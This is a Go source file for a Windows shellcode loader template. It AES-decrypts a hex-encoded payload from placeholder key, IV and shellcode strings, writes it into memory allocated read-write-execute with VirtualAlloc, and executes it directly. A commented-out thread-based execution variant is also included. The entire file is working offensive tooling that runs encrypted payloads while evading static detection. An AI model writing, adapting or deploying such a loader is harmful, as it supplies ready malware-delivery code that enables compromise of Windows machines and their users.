package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
	"crypto/aes"
	"crypto/cipher"
)

const MEM_COMMIT  = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_AllocateUTE_READWRITE  = 0x40
const PAGE_EXECUTE_READWRITE = 0x40
var K32 = syscall.NewLazyDLL("kernel32.dll")
var VirtualAlloc = K32.NewProc("VirtualAlloc")

// var CreateThread = K32.MustFindProc("CreateThread")
// var WaitForSingleObject = K32.MustFindProc("WaitForSingleObject")
// var USER32 = syscall.MustLoadDLL("user32.dll")
// var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")

func decryptthat(encKey string, iv string, cipherText string)(cleartext string){
	// encKey := "41414141414141414141414141414141"
	// iv := "41414141414141414141414141414141"
	// cipherText := "9710e04e5b8e574c9fad6a48057b2160"
	encKeyDecoded, err := hex.DecodeString(encKey)
	if err != nil {
		panic(err)
	}
	cipherTextDecoded, err := hex.DecodeString(cipherText)
	if err != nil {
		panic(err)
	}
	ivDecoded, err := hex.DecodeString(iv)
	if err != nil {
		panic(err)
	}
	block, err := aes.NewCipher([]byte(encKeyDecoded))
	if err != nil {
		panic(err)
	}

	mode := cipher.NewCBCDecrypter(block, []byte(ivDecoded))

	mode.CryptBlocks([]byte(cipherTextDecoded), []byte(cipherTextDecoded))

	cleartext = string(cipherTextDecoded)
	return
}


// Run SC with Syscall
func SyscallExecute(Shellcode []byte) (bool){
	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
	for i := 0; i < len(Shellcode); i++ {
		AddrPtr[i] = Shellcode[i]
	}
	syscall.Syscall(Addr, 0, 0, 0, 0)
	return true
}

// TODO : allow using threadexec
// func ThreadExecute(Shellcode []byte) {
// 	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
// 	AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
// 	for i := 0; i < len(Shellcode); i++ {
// 		AddrPtr[i] = Shellcode[i]
// 	}
// 	ThreadAddr, _, _ := CreateThread.Call(0, 0, Addr, 0, 0, 0)
// 	WaitForSingleObject.Call(ThreadAddr, 0xFFFFFFFF)
// }

func main() {	
	supersc := decryptthat("_KEY_","_IV_","_SHELLCODE_")
	sc, err := hex.DecodeString(supersc)
	if err != nil {
		fmt.Printf("Error decoding arg 1: %s\n", err)
		os.Exit(1)
	}
	// Run(sc)
	SyscallExecute(sc)
}
